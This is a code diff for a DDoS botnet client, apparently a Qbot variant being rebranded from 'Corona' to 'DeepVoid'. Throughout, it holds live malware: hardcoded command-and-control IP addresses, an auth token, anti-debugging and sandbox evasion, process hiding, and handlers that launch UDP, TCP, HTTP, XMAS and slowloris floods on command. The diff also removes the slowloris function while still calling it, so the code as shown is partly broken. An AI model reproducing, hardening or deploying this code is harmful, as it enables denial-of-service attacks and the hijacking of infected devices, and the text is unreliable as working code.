@@ -20,31 +20,26 @@
 
 #define SERVER_LIST_SIZE (sizeof(MainSocket))
 
-// 𝖣𝗒𝗇𝖺𝗆𝗂𝖼 𝖢&𝖢 𝖼𝗈𝗇𝖿𝗂𝗀
+// 𝖣𝖸𝖭𝖠𝖬𝖨𝖢 𝖢&𝖢 𝖢𝖮𝖭𝖥𝖨𝖦
 char *bot_hosts[] = {"198.12.97.77", "185.62.58.93", "104.238.183.146"};
 int bot_ports[] = {28, 1337, 8080};
 int current_cnc = 0;
 int cnc_count = 3;
 
-int bot_port = 28;
-char *bot_host = "198.12.97.77";
-
 uint32_t *pids;
 uint64_t numpids = 0;
 int MainSocket = 0;
 
-// 𝖡𝗈𝗍 𝖺𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝗂𝗈𝗇
-char auth_token[64] = "CoronaQBotSecureAuth2024";
+// 𝖡𝖮𝖳 𝖠𝖴𝖳𝖧𝖤𝖭𝖳𝖨𝖢𝖠𝖳𝖨𝖮𝖭
+char auth_token[64] = "DeepVoidSecureAuth2024";
 char build_id[32] = {0};
 
 // 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸
 void anti_analysis() {
-    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝖼𝗈𝗆𝗆𝗈𝗇 𝖽𝖾𝖻𝗎𝗀𝗀𝖾𝗋𝗌/𝗌𝖺𝗇𝖽𝖻𝗈𝗑𝖾𝗌
     if(getenv("LD_PRELOAD") != NULL) _exit(0);
     if(getenv("PYTHONPATH") != NULL) _exit(0);
     if(getenv("DEBUG") != NULL) _exit(0);
     
-    // 𝖢𝗁𝖾𝖼𝗄 𝖿𝗈𝗋 𝗏𝗂𝗋𝗍𝗎𝖺𝗅𝗂𝗓𝖾𝖽 𝖾𝗇𝗏𝗂𝗋𝗈𝗇𝗆𝖾𝗇𝗍𝗌
     FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
     if(cpuinfo) {
         char line[256];
@@ -71,25 +66,28 @@ void hide_process() {
 
 char *getBuild() {
 #if defined(__x86_64__) || defined(_M_X64)
-    return "ROOTS";
-#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
-    return "ARM";
-#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
-    return "ARM";
-#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
-    return "ARM";
-#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
-    return "ARM";
-#elif defined(mips) || defined(__mips__) || defined(__mips)
+    return "x86_64";
+#elif defined(__i386__) || defined(_M_IX86)
+    return "x86";
+#elif defined(__aarch64__)
+    return "ARM64";
+#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__)
+    return "ARM7";
+#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__)
+    return "ARM6";
+#elif defined(__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__)
+    return "ARM5";
+#elif defined(__mips__)
     return "MIPS";
-#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
+#elif defined(__mipsel__)
     return "MIPSEL";
+#elif defined(__powerpc__)
+    return "PPC";
 #else
     return "UNKNOWN";
 #endif
 }
 
-// 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝖾 𝖻𝗈𝗍 𝖨𝖣
 void generate_bot_id(char *buffer, size_t len) {
     char hostname[256];
     gethostname(hostname, sizeof(hostname));
@@ -112,20 +110,19 @@ void registermydevice(char *JoinName) {
     char registermsg[256];
     generate_bot_id(build_id, sizeof(build_id));
     
-    sprintf(registermsg, "\e[0m\e[0;31m[\e[0;36mCorona\e[0;31m]\e[0m Device Joined As [%s] Arch: [%s] ID: [%s]\r\n", 
+    sprintf(registermsg, "\e[0m\e[0;31m[\e[0;36mDeepVoid\e[0;31m]\e[0m Device Joined As [%s] Arch: [%s] ID: [%s]\r\n", 
             JoinName, getBuild(), build_id);
-    write(MainSocket, registermsg, strlen(registermsg));
+    if(MainSocket > 0) {
+        write(MainSocket, registermsg, strlen(registermsg));
+    }
 }
 
-// 𝖡𝗈𝗍 𝖺𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝗂𝗈𝗇
 int bot_authenticate(int sock) {
     char buffer[128];
     
-    // 𝖲𝖾𝗇𝖽 𝖺𝗎𝗍𝗁 𝗍𝗈𝗄𝖾𝗇
     if(send(sock, auth_token, strlen(auth_token), MSG_NOSIGNAL) <= 0)
         return 0;
     
-    // 𝖶𝖺𝗂𝗍 𝖿𝗈𝗋 𝗋𝖾𝗌𝗉𝗈𝗇𝗌𝖾
     fd_set fds;
     struct timeval tv;
     
@@ -144,91 +141,78 @@ int bot_authenticate(int sock) {
     return (strstr(buffer, "AUTH_OK") != NULL);
 }
 
-char *Connection(char *namezz) {
+int Connection(char *namezz) {
     struct sockaddr_in vSparkzyy;
     int attempts = 0;
+    
+    // 𝖱𝖮𝖳𝖠𝖳𝖤 𝖢&𝖢 𝖲𝖤𝖱𝖵𝖤𝖱𝖲
+    current_cnc = (current_cnc + 1) % cnc_count;
+    char *bot_host = bot_hosts[current_cnc];
+    int bot_port = bot_ports[current_cnc];
     
 retryme:
     MainSocket = socket(AF_INET, SOCK_STREAM, 0);
     if(MainSocket < 0) {
         sleep(5);
-        goto retryme;
+        attempts++;
+        if(attempts < 10) goto retryme;
+        return -1;
     }
-    
-    // 𝖱𝗈𝗍𝖺𝗍𝖾 𝖢&𝖢 𝗌𝖾𝗋𝗏𝖾𝗋𝗌
-    current_cnc = (current_cnc + 1) % cnc_count;
-    bot_host = bot_hosts[current_cnc];
-    bot_port = bot_ports[current_cnc];
     
     vSparkzyy.sin_family = AF_INET;
     vSparkzyy.sin_port = htons(bot_port);
-    vSparkyy.sin_addr.s_addr = inet_addr(bot_host);
+    vSparkzyy.sin_addr.s_addr = inet_addr(bot_host);
     
     int check = connect(MainSocket, (struct sockaddr *)&vSparkzyy, sizeof(vSparkzyy));
     if(check == -1) {
         close(MainSocket);
+        MainSocket = -1;
         attempts++;
         if(attempts < 10) {
             sleep(5);
             goto retryme;
-        } else {
-            return NULL;
         }
+        return -1;
     }
     
-    // 𝖠𝗎𝗍𝗁𝖾𝗇𝗍𝗂𝖼𝖺𝗍𝖾 𝗐𝗂𝗍𝗁 𝖢&𝖢
     if(!bot_authenticate(MainSocket)) {
         close(MainSocket);
+        MainSocket = -1;
         sleep(5);
-        goto retryme;
+        attempts++;
+        if(attempts < 10) goto retryme;
+        return -1;
     }
     
-end:
     registermydevice(namezz);
     return 0;
 }
 
-// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖠𝖳𝖳𝖠𝖢𝖪 𝖬𝖤𝖳𝖧𝖮𝖣𝖲
-void send_slowloris(char *host, int port, int timeEnd) {
-    int sock, i;
-    char request[512];
-    
-    for(i = 0; i < 500; i++) {
-        if(fork() == 0) {
-            time_t start = time(NULL);
-            while(time(NULL) < start + timeEnd) {
-                sock = socket_connect(host, port);
-                if(sock > 0) {
-                    sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\n", host);
-                    send(sock, request, strlen(request), MSG_NOSIGNAL);
-                    sleep(timeEnd);
-                }
-                close(sock);
-            }
-            _exit(0);
-        }
-    }
-}
-
 void proc_cmd(int argc, unsigned char **argv) {
     if(!strcmp(argv[0], "UDP")) {
-        if(argc <4) return;
+        if(argc < 5) return;
         unsigned char *ip = argv[1];
         int port = atoi(argv[2]), time = atoi(argv[3]), packetsize = atoi(argv[4]);
-        if(!fork()) {
-            printf("[UDP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] UDP Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
             udpattack(ip, port, time, packetsize);
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
     
     if (!strcmp(argv[0], "HTTP")) {
-        if (argc < 6) return;
-        if(!fork()) {
-            printf("[HTTP] Attack Being Sent \r\n");
+        if (argc < 7) return;
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] HTTP Attack Sent\r\n");
             SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
@@ -239,10 +223,13 @@ void proc_cmd(int argc, unsigned char **argv) {
         int port = atoi(argv[2]);
         int time = atoi(argv[3]);
         unsigned char *flags = argv[4];
-        if(!fork()) {
-            printf("[TCP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] TCP Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
             SendTCP(ip, port, time, flags);
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
@@ -252,10 +239,13 @@ void proc_cmd(int argc, unsigned char **argv) {
         unsigned char *ip = argv[1];
         int port = atoi(argv[2]);
         int time = atoi(argv[3]);
-        if(!fork()) {
-            printf("[STD] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] STD Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
             sendSTD(ip, port, time);
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
@@ -265,10 +255,13 @@ void proc_cmd(int argc, unsigned char **argv) {
         unsigned char *ip = argv[1];
         int port = atoi(argv[2]);
         int time = atoi(argv[3]);
-        if(!fork()) {
-            printf("[XMAS] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] XMAS Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
             xmas(ip, port, time);
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
@@ -278,21 +271,25 @@ void proc_cmd(int argc, unsigned char **argv) {
         char *host = argv[1];
         int port = atoi(argv[2]);
         int time = atoi(argv[3]);
-        if(!fork()) {
+        pid_t pid = fork();
+        if(pid == 0) {
+            printf("[DeepVoid] Slowloris Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
             send_slowloris(host, port, time);
             _exit(0);
+        } else if(pid > 0) {
+            return;
         }
         return;
     }
     
     if(strstr(argv[0], "hahawekillyou")) {
-        printf("\r\n[Corona] Disconnected! \r\n");
+        printf("\r\n[DeepVoid] Disconnected! \r\n");
         kill_bk();
         _exit(0);
     }
     
     if(strstr(argv[0], "bkstop")) {
-        printf("\r\n[BotKiller] Stopped! \r\n");
+        printf("\r\n[DeepVoid] BotKiller Stopped! \r\n");
         kill_bk();
     }
 
@@ -311,7 +308,7 @@ void proc_cmd(int argc, unsigned char **argv) {
 #define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
 #define LOCALHOST (inet_addr("127.0.0.1"))
 
-static void ensure_bind(uint32_t bind_addr) {
+void ensure_bind(uint32_t bind_addr) {
     int fd = -1;
     struct sockaddr_in addr;
     
@@ -325,7 +322,6 @@ static void ensure_bind(uint32_t bind_addr) {
     addr.sin_addr.s_addr = bind_addr;
     
     NONBLOCK(fd);
-    errno = 0;
     
     int ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
     int e = errno;
@@ -344,10 +340,9 @@ static void ensure_bind(uint32_t bind_addr) {
     
     listen(fd, 1);
     close(fd);
-    return;
 }
 
-static uint32_t local_addr(void) {
+uint32_t local_addr(void) {
     int fd = -1;
     struct sockaddr_in addr;
     socklen_t addr_len = sizeof(addr);
@@ -370,14 +365,16 @@ static uint32_t local_addr(void) {
 
 void recv_buf() {
     char buf[512];
-    while(read(MainSocket, buf, sizeof(buf)) > 0) {
+    ssize_t bytes_read;
+    
+    while(MainSocket > 0 && (bytes_read = read(MainSocket, buf, sizeof(buf)-1)) > 0) {
+        buf[bytes_read] = '\0';
+        
         int r, argcount = 0;
         unsigned char *buffer[12 + 1] = {0};
         char *strr;
         
-        for(strr = strtok(buf, " "); strr != NULL; strr = strtok(NULL, " ")) {
-            if(argcount >= 12) break;
-            
+        for(strr = strtok(buf, " "); strr != NULL && argcount < 12; strr = strtok(NULL, " ")) {
             buffer[argcount] = malloc(strlen(strr) + 1);
             if(!buffer[argcount]) break;
             
@@ -390,8 +387,12 @@ void recv_buf() {
         }
         
         for(r = 0; r < argcount; r++) {
-            if(buffer[r]) free(buffer[r]);
+            if(buffer[r]) {
+                free(buffer[r]);
+            }
         }
+        
+        memset(buf, 0, sizeof(buf));
     }
 }
 
@@ -406,41 +407,39 @@ int socket_connect(char *host, in_port_t port) {
     sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
     setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
     if (sock == -1) return 0;
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
+        close(sock);
+        return 0;
+    }
     return sock;
 }
 
 int main(int argc, unsigned char * argv[]) {
-    // 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖠𝖭𝖳𝖨-𝖠𝖭𝖠𝖫𝖸𝖲𝖨𝖲
     anti_analysis();
     
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
     
-    uint32_t local;
-    local = local_addr();
+    uint32_t local = local_addr();
     ensure_bind(local);
     
+    // 𝖥𝖨𝖷𝖤𝖣 𝖥𝖮𝖱𝖪 𝖧𝖠𝖭𝖣𝖫𝖨𝖭𝖦
     pid_t pid = fork();
     if(pid > 0) _exit(0);
     if(pid < 0) _exit(1);
     
-    // 𝖯𝖱𝖮𝖢𝖤𝖲𝖲 𝖲𝖳𝖤𝖠𝖫𝖳𝖧
     hide_process();
     
     if (SERVER_LIST_SIZE <= 0) return 0;
     
-    // 𝖲𝗍𝖾𝖺𝗅𝗍𝗁
     strncpy(argv[0], "", strlen(argv[0]));
     
     srand(time(NULL) ^ getpid());
     init_rand(time(NULL) ^ getpid());
     
-    // 𝖱𝖤𝖲𝖨𝖫𝖨𝖤𝖭𝖳 𝖢𝖮𝖭𝖭𝖤𝖢𝖳𝖨𝖮𝖭 𝖫𝖮𝖮𝖯
+    int backoff = 1;
     while(1) {
-        if(Connection(argv[1]) == NULL) {
-            // 𝖤𝖷𝖯𝖮𝖭𝖤𝖭𝖳𝖨𝖠𝖫 𝖡𝖠𝖢𝖪𝖮𝖥𝖥
-            static int backoff = 1;
+        if(Connection(argv[1]) == -1) {
             sleep(backoff);
             backoff = (backoff < 300) ? backoff * 2 : 300;
             continue;
@@ -449,7 +448,10 @@ int main(int argc, unsigned char * argv[]) {
         botkiller(MainSocket);
         recv_buf();
         
-        close(MainSocket);
+        if(MainSocket > 0) {
+            close(MainSocket);
+            MainSocket = -1;
+        }
         sleep(5);
     }
     
